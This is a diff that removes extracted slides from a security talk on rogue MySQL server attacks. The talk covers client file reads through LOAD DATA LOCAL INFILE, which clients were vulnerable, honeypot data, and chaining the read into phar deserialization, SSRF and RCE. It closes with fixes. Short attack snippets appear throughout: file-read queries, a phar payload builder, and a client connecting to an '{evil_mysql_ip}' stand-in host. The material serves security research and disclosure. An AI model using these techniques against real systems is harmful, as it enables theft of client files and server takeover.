@@ -1,577 +1,0 @@
-Comprehensive analysis of the mysql client attack chain
-LoRexxar@Knownsec 404Team
-
-About me
-LoRexxar
-@Knownsec 404Team / @Vidar-Team Security researcher / ctfer Web / smart contract https://lorexxar.cn
-· Dawu
-· @Knownsec 404Team · Security researcher · Evernote For Windows Read Local File and Command Execute Vulnerabilities
-
-What's Mysql Client Attack?
-2018.06 TCTF2018 Final h4x0rs.club pt.3
-
-What's Mysql Client Attack?
-
-Write a file with controlled data
-Controllable mysql config
-Controllable mysql query
-Further use
-
-2018.06 TCTF2018 Final h4x0rs.club pt.3
-
-What's Mysql Client Attack?
-
-Write a file with controlled data
-
-2018.06 TCTF2018 Final h4x0rs.club pt.3 Dragon Sector && Cykor Unexpected use to get Flag
-
-Controllable mysql config
-Read mysql client file
-
-What's Mysql Client Attack?
-
-load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
-
-Read server file `/etc/passwd' insert into table test.
-Limit by secure-file-priv
-
-mysql> select * from test;
-
-+----+--------------------------------------------------------------------------------------- +------------------------------------------------------------------------
-
--------+
-
-| id | a
-
-| b
-
-|
-
-+----+--------------------------------------------------------------------------------------- +------------------------------------------------------------------------
-
--------+
-
-| 0 | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-
-| bin:x:2:2:bin:/bin:/usr/sbin/nologin
-
-|
-
-| 0 | sync:x:4:65534:sync:/bin:/bin/sync
-
-| games:x:5:60:games:/ usr/games:/usr/sbin/nologin
-
-|
-
-| 0 | lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-
-| mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-
-|
-
-| 0 | uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-
-| proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-
-|
-
-| 0 | backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-
-| list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-
-|
-
-| 0 | gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-
-| nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-
-|
-
-| 0 | systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false | systemd-resolve:x:102:104:systemd
-
-Resolver,,,:/run/systemd/resolve:/bin/false |
-
-| 0 | syslog:x:104:108::/home/syslog:/bin/false
-
-| _apt:x:105:65534::/nonexistent:/bin/false
-
-|
-
-| 0 | messagebus:x:107:111::/var/run/dbus:/bin/false
-
-| uuidd:x:108:112::/run/uuidd:/bin/false
-
-|
-
-| 0 | sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
-
-| ubuntu:x:500:500:ubuntu,,,:/home/ubuntu:/bin/bash
-
-|
-
-| 0 | mysql:x:1000:1000::/home/mysql:/sbin/nologin
-
-| www:x:1001:1001::/home/www:/sbin/nologin
-
-|
-
-What's Mysql Client Attack?
-load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
-· Read Client file insert into table · Not limit by secure-file-priv · Most Mysql Client default allowed
-
-What's Mysql Client Attack?
-load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
-
-How to make a rogue Mysql Server?
-1Greeting
-Mysql and Server banner
-
-How to make a rogue Mysql Server?
-1Greeting
-2Authentication
--User password -Client configuration
-
-How to make a rogue Mysql Server?
-1Greeting
-2Authentication
-3Query
-Load data local infile "c:/Windows/win.ini" into table test FIELDS TERMINATED BY `\n';
-
-How to make a rogue Mysql Server?
-1Greeting 2Authentication 3Query 4Waiting...
-
-How to make a rogue Mysql Server?
-
-1Greeting
-Mysql and Server banner
-
-Hi~. I want to insert the contents
-of data file
-
-2Authentication
-
-C
-
-S
-
-User password and some config
-
-l
-
-3Query
-
-i e
-
-Load data local infile...
-
-n
-
-4Waiting...
-
-t
-
-OK. get me the
-
-e
-
-contents of data file
-
-r
-
-v
-
-e
-
-r This is the contents
-
-of data file, xxxxxxxx
-
-How to make a rogue Mysql Server?
-
-1Greeting
-
-Hi~. select * from test.
-
-Mysql and Server banner
-
-2Authentication
-
-C
-
-S
-
-User password and some config
-
-l
-
-3Query
-
-i e
-
-Load data local infile...
-
-n
-
-4Waiting...
-
-t
-
-OK. get me the
-
-e
-
-contents of data file
-
-r
-
-v
-
-e
-
-r This is the contents
-
-of data file, xxxxxxxx
-
-How to make a rogue Mysql Server?
-
-How to make a rogue Mysql Server?
-
-Hi~.
-
-A patched server could in fact
-
-select * from test.
-
-reply with a file-transfer
-
-request to any statement, not
-
-just LOAD DATA LOCAL.
-
-C
-
-S
-
-l
-
-OK. get me the
-
-e
-
-i
-
-contents of data file
-
-r
-
-Clientfile-
-
-e
-
-v
-
-transfer
-
-n
-
-e
-
-t
-
-r
-
-This is the contents
-
-of data file, xxxxxxxx
-
-How to make a rogue Mysql Server?
-Hello, Greeting Hello~~
-User=root,pass=root OK~~
-Set character set `utf-8'; Read /etc/passwd
-root:x:0:0:root..
-
-How to make a rogue Mysql Server?
-2013.08 Presentation from Yuri GoltsevDatabase Honeypot by design 2013.09 MySQL fake server to read files of connected clients(github) 2018.04.23 Abusing MySQL LOCAL INFILE to read client files(multiple ways of use)
-
-What should we need?
-· A website or app that can control mysql configuration · A vulnerable Mysql Client ·?
-
-Vulnerable vendor
-Mysql Client PHP Mysql PHP Mysqli PHP PDO Python MySQLdb Python Mysqlclient Java JDBC Driver Navicat
-
-pwned pwned Close by default in PHP 7.3.4 Close by default pwned pwned pwned pwned
-
-Probe
-PHP iprober2  PHP for LNMP UPUPW PHP  ...
-
-failure failure failure failure
-
-What should we need?
-· A website or app that can control mysql configuration · A vulnerable Mysql Client · One query ·?
-
-Load data in Excel
-· Local Excel · WPS onlion · Microsoft excel · Google Sheets
-· Supermetrice · Advanced CFO Solutions MySQL Query · SeekWell · Skyvia Query Gallery · database Borwser failed · Kloudio
-
-pwned failure(None) failure(disable)
-pwned failure(disable) failure(disable) failure(disable) failure(disable) pwned
-
-  
-
-     Ucloud QiNiu    Cloud Cloud Google Cloud
-AWS
-
-DTS
-
-Disable Load data
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-vulnerable
-
-Status Fixed 2018.12.14
-Fixed 2018.11.27 Fixed 2018.11.29 Fixed 2018.11.28 Report 2018.11.27
-
-What should we need?
-
-· A website or app that can control mysql configuration
-
-· A vulnerable Mysql Client
-
-· One query
-
-Arbitrary File Read
-
-Maybe do more?
-
-Honeypot
-· Numerous github monitoring tools are actively capturing mysql account password leaks every day
-· Numerous scanners open mysql scan weak passwords for external networks
-
-Honeypot
-From 2018.09 to 2018.11 A ez open honeypot in internet
-499 ip connection requests 1 file read from linux 5 file read from windows
-
-What should we need?
-· Mysql configuration in github · Or Weakless Mysql Server · A vulnerable Mysql Client
-
-Honeypot
-
-Make Arbitrary File Read better?
-How about CMS?
-
-AFR To Leak Profile
-· Ucenter in back of Discuz x3.4
-
-AFR To Leak Profile
-· Ucenter in back of Discuz x3.4
-
-· AFR the Discuz x3.4 config file config
-· config/config_ucenter.php
-· config/config_global.php ... define('UC_KEY', 'yeN3g9EbNfiaYfodV63dI1j8Fbk5HaL7W4yaW4y7u2j4Mf45mfg2v899g451k576'); ...
-
-... $_config['security']['authkey'] ...
-
-= 'asdfasfas';
-
-AFR To Leak Profile
-· Ucenter in back of Discuz x3.4 · AFR the Discuz x3.4 config file config
-· config/config_ucenter.php · config/config_global.php
-· UC_KEY + action = Code for UCAPI · authkey + saltkey + admin uid + admin username = Formhash for UCAPI · A Vulnerable to getshell in UCAPI
-
-AFR To Leak Profile To Getshell
-
-Can we make AFR better more?
-
-Can we make AFR better more?
-Phar://
-
-Phar://
-· 2018 BlackHat. Sam Thomas
-· <File Operation Induced Unserialization via the "phar://" Stream Wrapper>
-· "Phar://" Stream API in file Function can cause unserialization.
-
-Phar://
-"Phar://" Stream API in file Function can cause unserialization.
-/php/php-src/blob/master/ext/standard/file.c L551
-PHP_FUNCTION(file_get_contents) {
-... stream = php_stream_open_wrapper_ex(filename, "rb",
-(use_include_path ? USE_PATH : 0) | REPORT_ERRORS, NULL, context); ...
-
-Phar://
-/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c L43-L52
-
-if (PG(open_basedir)) { if (php_check_open_basedir_ex(filename, 0) == -1) {
->error_msg, "open_basedir restriction in effect. Unable to open file"); info->error_no = CR_UNKNOWN_ERROR;
-
-strcpy(infoDBG_RETURN(1);
-
-} } info->filename = filename; info->fd = php_stream_open_wrapper_ex((char *)filename, "r", 0, NULL, context);
-
-Phar file with a stub
-<?php class A {
-public $s = ''; public function __wakeup () {
-echo "pwned!!"; } }
-
-@unlink("phar.phar"); $phar = new Phar("phar.phar"); $phar->startBuffering(); $phar->setStub("GIF89a "."<?php __HALT_COMPILER(); ?>"); //stub $o = new A(); $phar->setMetadata($o); $phar->addFromString("test.txt", "test"); $phar->stopBuffering();?>
-
-Test PHP code
-<?php class A {
-public $s = ''; public function __wakeup () {
-echo "pwned!!"; } }
-
-$m = mysqli_init(); $s = mysqli_real_connect($m, `{evil_mysql_ip}', `root', `123456', `test', 3306); $p = mysqli_query($m, 'select 1;');
-
-Evil mysql server
-· ... · PORT = 3306 · ... · filelist = (r`phar://./phar.phar') · ...
-
-Phar:// + AFR
-
-Can we make AFR better more?
-· A website or app that can control mysql configuration · A vulnerable Mysql Client · One query ·?
-
-Can we make AFR better more?
-
-· A website or app that can control mysql configuration
-
-· A vulnerable Mysql Client
-
-· One query
-
-· Upload a file with stub(Phar)
-
-Deserialization vulnerability
-
-Final Vulerable
-
-Website
-
-Rogue database Phar:/xxx.jpg
-
-Phar file
-
-POP chain
-
-Can we make AFR better more again?
-
-Can we make AFR better more again?
-POP chain
-
-Example in Real world
-· Ucenter in back of DEDECMSv5.7 · Ucenter config contain Mysql Server config
-
-Example in Real world
-
-· Ucenter in back of DEDECMSv5.7
-
-· Ucenter config contain Mysql Server config
-
-· No POP chain for DEDECMSv5.7,but a little trick
-
-... function __destruct() {
-unset($this->tpl); $this->dsql->Close(TRUE); } ...
-
-__call()
-
-Example in Real world
-· Ucenter in back of DEDECMSv5.7 · Ucenter config contain Mysql Server config · No POP chain for DEDECMSv5.7,but a little trick · Deserialization + __call + SoapClient = SSRF
-
-Deserialization SoapClient to SSRF
-delete
-
-Example in Real world
-· Ucenter in back of DEDECMSv5.7 · Upload a file with stub(Phar) in back or avatar · Deserialization + __call + SoapClient = SSRF
-
-Can we make AFR better more?
-
-· A website or app that can control mysql configuration
-
-· A vulnerable Mysql Client
-
-· One query
-
-· Upload a file with stub(Phar) · A gadgets could call any method
-
-SSRF
-
-Can we make AFR better more again?
-POP chain
-
-Can we make AFR better more again?
-POP chain to RCE
-
-Final Vulerable
-· A website or app that can control mysql configuration · A vulnerable Mysql Client · One query · Upload a file with stub(Phar) · A POP chain to ?
-
-Can we make it easier?
-
-Can we make it easier?
-ARP or DNS cache pollution
-
-ARP or DNS cache pollution
-Select 1 Web
-
-Database
-
-ARP or DNS cache pollution
-Select 1 Web
-ARP/DCP
-
-Database Rogue database
-
-Final Vulerable
-· A website or app that can control mysql configuration · A vulnerable Mysql Client · One query · Upload a file with stub(Phar) · A POP chain to ?
-
-Let's Fix it
-
-Fix it
-· For Server
-· Set local_infile disabled
-· For Client
-· For mysql client. Use ­local-infile=0 · For JDBC. Set allowLoadLocalInfile=false · For PHP mysqli or mysql
-· Set mysqli.allow_local_infile = Off in php.ini · Use mysqli_option to set MYSQLI_OPT_LOCAL_INFILE=false after mysqli_real_connect
-
-A little hint
-· phpmyadmin patch in 2019.01.22 · https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a 95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f
-
-A little hint
-· phpmyadmin patch in 2019.01.22 · https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a 95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f
-if (defined('PMA_ENABLE_LDI')) { mysqli_options($link, MYSQLI_OPT_LOCAL_INFILE, true);
-} else { mysqli_options($link, MYSQLI_OPT_LOCAL_INFILE, false);
-} ... $return_value = mysqli_real_connect($link, $host, $user, $password, '',
-$server['port'], $server['socket'], $client_flags );
-
-A little hint
-Use mysqli_option to set MYSQLI_OPT_LOCAL_INFILE=false after mysqli_real_connect
-void mysqli_common_connect(INTERNAL_FUNCTION_PARAMETERS, zend_bool is_real_connect, zend_bool in_ctor) /* {{{ */ {
-mysql_options(mysql->mysql, MYSQL_OPT_LOCAL_INFILE, (char *)&MyG(allow_local_infile)); }
-
-Thanks
-@LoRexxar
-lorexxar@gmail.com
-
-
